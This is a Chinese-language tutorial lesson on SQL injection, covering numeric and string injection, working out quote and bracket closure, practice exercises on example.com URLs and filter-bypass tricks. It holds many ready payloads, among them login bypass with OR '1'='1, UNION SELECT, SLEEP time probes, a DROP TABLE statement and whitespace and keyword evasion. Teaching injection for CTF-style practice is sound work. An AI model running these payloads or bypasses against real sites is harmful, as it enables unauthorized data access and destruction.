# Day 15：SQL注入入门——数字型与闭合方式

> **学习目标**：理解SQL注入原理，掌握数字型和字符型注入的区别，学会测试闭合方式
> 
> **学习时长**：2小时
> 
> **难度等级**：⭐⭐⭐⭐

---

## 📚 今日内容概览

1. SQL注入原理详解
2. 数字型注入测试
3. 字符型注入测试
4. 闭合方式判断
5. 实战练习：判断注入类型
6. 常见错误避免

---

## 一、SQL注入原理详解

### 1.1 什么是SQL注入

```
SQL注入是什么：
  攻击者通过在输入参数中注入SQL语句
  使原本的SQL查询发生改变
  从而执行恶意操作

原理：
  程序直接将用户输入拼接到SQL语句中
  没有进行过滤或转义
  导致用户输入被当作SQL代码执行

示例：
  正常查询：SELECT * FROM users WHERE id = 1
  注入后：SELECT * FROM users WHERE id = 1 OR 1=1
  
  结果：返回所有用户数据
```

### 1.2 SQL注入的危害

```
危害：
  1. 数据泄露：获取数据库中的敏感数据
  2. 数据篡改：修改或删除数据库内容
  3. 权限提升：绕过登录验证
  4. 服务器控制：执行系统命令
  5. 网站崩溃：删除重要数据

示例：
  DELETE FROM users WHERE id=1; DROP TABLE users--
  这条语句会删除指定用户并删除整个表
```

### 1.3 SQL注入的条件

```
条件：
  1. 用户可控输入：输入参数可以被用户控制
  2. 直接拼接SQL：程序直接将输入拼接到SQL语句中
  3. 无有效过滤：没有对特殊字符进行过滤或转义

示例：
  $id = $_GET['id'];
  $sql = "SELECT * FROM users WHERE id = $id";
  // 如果用户输入1 OR 1=1，就会变成：
  // SELECT * FROM users WHERE id = 1 OR 1=1
```

---

## 二、数字型注入测试

### 2.1 什么是数字型注入

```
数字型注入：
  参数类型是数字
  SQL语句中参数没有被引号包裹
  如：WHERE id = 1

特点：
  - 参数直接作为数字使用
  - 不需要闭合引号
  - 直接使用AND/OR进行测试

示例：
  正常：SELECT * FROM users WHERE id = 1
  注入：SELECT * FROM users WHERE id = 1 AND 1=1
```

### 2.2 测试方法

```
测试步骤：
  1. 找到数字型参数（如?id=1）
  2. 在参数后添加AND 1=1
  3. 观察响应是否正常
  4. 添加AND 1=2
  5. 观察响应是否变化
  
  如果：
  - ?id=1 AND 1=1 正常
  - ?id=1 AND 1=2 异常
  则存在数字型注入

示例：
  原请求：http://example.com/user?id=1
  测试1：http://example.com/user?id=1 AND 1=1
  测试2：http://example.com/user?id=1 AND 1=2
  
  测试3：http://example.com/user?id=1 OR 1=1
  测试4：http://example.com/user?id=1 OR 1=2
```

### 2.3 数字型注入Payload

```
常用Payload：
  - ?id=1 AND 1=1
  - ?id=1 AND 1=2
  - ?id=1 OR 1=1
  - ?id=1 OR 1=2
  - ?id=-1 UNION SELECT 1,2,3
  - ?id=1 ORDER BY 3
  
  进阶Payload：
  - ?id=1 SLEEP(5) -- MySQL延时注入
  - ?id=1 AND IF(1=1, SLEEP(5), 0)
```

---

## 三、字符型注入测试

### 3.1 什么是字符型注入

```
字符型注入：
  参数类型是字符串
  SQL语句中参数被引号包裹
  如：WHERE username = 'admin'

特点：
  - 参数被引号包裹
  - 需要先闭合引号
  - 再添加恶意SQL
  - 最后注释掉剩余语句

示例：
  正常：SELECT * FROM users WHERE username = 'admin'
  注入：SELECT * FROM users WHERE username = 'admin' OR '1'='1
```

### 3.2 测试方法

```
测试步骤：
  1. 找到字符型参数（如?username=admin）
  2. 在参数后添加单引号'
  3. 观察是否有SQL错误
  4. 如果有错误，说明存在注入点
  5. 尝试闭合方式：' OR 1=1--
  
  如果：
  - ?username=admin' 报错
  - ?username=admin' OR '1'='1 正常
  则存在字符型注入

示例：
  原请求：http://example.com/login?username=admin
  测试1：http://example.com/login?username=admin'
  测试2：http://example.com/login?username=admin' OR '1'='1
  测试3：http://example.com/login?username=admin' OR '1'='2
```

### 3.3 字符型注入Payload

```
常用Payload：
  - ?username=admin'
  - ?username=admin' OR '1'='1
  - ?username=admin' OR '1'='2
  - ?username=admin' --
  - ?username=admin' UNION SELECT 1,2,3--
  
  进阶Payload：
  - ?username=admin' AND SLEEP(5)--
  - ?username=admin' AND IF(1=1,SLEEP(5),0)--
```

---

## 四、闭合方式判断

### 4.1 常见闭合方式

```
闭合方式分类：
  1. 单引号闭合：WHERE username = 'admin'
  2. 双引号闭合：WHERE username = "admin"
  3. 括号+单引号：WHERE (username = 'admin')
  4. 括号+双引号：WHERE (username = "admin")
  5. 数字型无需闭合：WHERE id = 1

判断方法：
  依次尝试不同的闭合方式
  观察是否能正常执行
```

### 4.2 闭合方式测试表

| 测试Payload | 预期响应 | 说明 |
|:---|:---|:---|
| ?id=1' | 报错 | 可能是字符型 |
| ?id=1'' | 正常 | 可能是单引号闭合 |
| ?id=1" | 报错 | 可能是双引号闭合 |
| ?id=1"" | 正常 | 可能是双引号闭合 |
| ?id=1) | 报错 | 可能有括号 |
| ?id=1') | 正常 | 可能是('admin')形式 |

### 4.3 判断流程

```
判断流程：
  1. 测试?id=1'（单引号）
     - 如果报错，继续测试
     - 如果正常，可能是数字型或已过滤
  
  2. 测试?id=1''（双单引号）
     - 如果正常，说明是单引号闭合
     - 如果报错，继续测试
  
  3. 测试?id=1"（双引号）
     - 如果报错，继续测试
     - 如果正常，可能是双引号闭合
  
  4. 测试?id=1""（双双引号）
     - 如果正常，说明是双引号闭合
  
  5. 测试?id=1)（右括号）
     - 如果报错，可能有括号包裹
     - 尝试?id=1')或?id=1")
  
  6. 如果都正常，测试数字型注入
     - ?id=1 AND 1=1
     - ?id=1 AND 1=2
```

---

## 五、实战练习：判断注入类型

### 5.1 练习1：数字型注入

```
题目：
  URL：http://example.com/api/user?id=1
  请判断是否存在SQL注入，如果存在，是什么类型？

测试步骤：
  1. 访问?id=1 → 正常显示用户信息
  2. 访问?id=1 AND 1=1 → 正常显示
  3. 访问?id=1 AND 1=2 → 显示为空或报错
  4. 结论：存在数字型注入

后续测试：
  1. 测试列数：?id=1 ORDER BY 3
  2. 联合查询：?id=-1 UNION SELECT 1,2,3
```

### 5.2 练习2：字符型注入

```
题目：
  URL：http://example.com/login?username=admin&password=123
  请判断username参数是否存在SQL注入。

测试步骤：
  1. 访问?username=admin' → 报错：SQL syntax error
  2. 访问?username=admin'' → 正常显示登录失败
  3. 访问?username=admin' OR '1'='1 → 登录成功
  4. 结论：存在字符型注入，单引号闭合

后续测试：
  1. 测试列数：?username=admin' ORDER BY 3--
  2. 联合查询：?username=admin' UNION SELECT 1,2,3--
```

### 5.3 练习3：复杂闭合方式

```
题目：
  URL：http://example.com/search?q=test
  请判断q参数的闭合方式。

测试步骤：
  1. 访问?q=test' → 报错
  2. 访问?q=test'' → 报错
  3. 访问?q=test") → 正常
  4. 访问?q=test") OR 1=1-- → 显示所有结果
  5. 结论：闭合方式是("test")

后续测试：
  1. 确认：?q=test") OR 1=1--
  2. 联合查询：?q=test") UNION SELECT 1,2,3--
```

---

## 六、常见错误避免

### 6.1 常见错误

```
错误1：忘记注释
  错误：?id=1' OR 1=1
  正确：?id=1' OR 1=1--
  
  原因：后面可能还有SQL语句需要注释掉

错误2：闭合方式错误
  错误：使用单引号测试双引号闭合
  正确：先测试单引号，再测试双引号

错误3：大小写问题
  错误：?id=1 or 1=1（某些数据库区分大小写）
  正确：?id=1 OR 1=1

错误4：空格被过滤
  错误：?id=1%20AND%201=1（可能被过滤）
  正确：?id=1/**/AND/**/1=1（用注释代替空格）

错误5：特殊字符被过滤
  错误：直接使用OR 1=1
  正确：尝试使用其他Payload
```

### 6.2 绕过技巧

```
绕过技巧：
  1. 使用注释代替空格：/**/
  2. 使用URL编码：%20、%09、%0a
  3. 使用大小写混合：Or、AnD
  4. 使用等价语句：||代替OR，&&代替AND
  5. 使用十六进制编码：UNION SELECT 0x31,0x32,0x33
  
示例：
  ?id=1/**/AND/**/1=1
  ?id=1%20AND%201=1
  ?id=1AnD1=1
  ?id=1&&1=1
```

---

## 七、今日总结

### 7.1 知识点回顾

```
✅ SQL注入原理
  - 定义和危害
  - 注入条件

✅ 数字型注入
  - 特点
  - 测试方法
  - Payload

✅ 字符型注入
  - 特点
  - 测试方法
  - Payload

✅ 闭合方式判断
  - 单引号闭合
  - 双引号闭合
  - 括号闭合

✅ 常见错误和绕过技巧
```

### 7.2 关键记忆点

```
记住这个口诀：

数字型，直接用AND/OR测试；
字符型，先加单引号看报错；
闭合方式要判断，单双引号都试试；
注释一定要加上，--或/* */都可以！

判断流程：
  加引号看报错 → 试闭合方式 → 验证注入点
```

### 7.3 今日作业

```
必做题：
  1. 完成三个练习题目
  2. 记录测试步骤和结果
  3. 练习不同闭合方式的测试

选做题：
  1. 尝试更多闭合方式组合
  2. 练习绕过技巧
  3. 在Bugku或CTFHub找题目练习

提交内容：
  - 测试步骤记录
  - 注入类型判断结果
  - 截图
```

### 7.4 明日预告

```
Day 16：ORDER BY判列数

学习内容：
  - ORDER BY原理
  - 判断列数方法
  - 实战练习
```

---

**恭喜你完成Day 15的学习！明天学习ORDER BY判列数！** 🎉
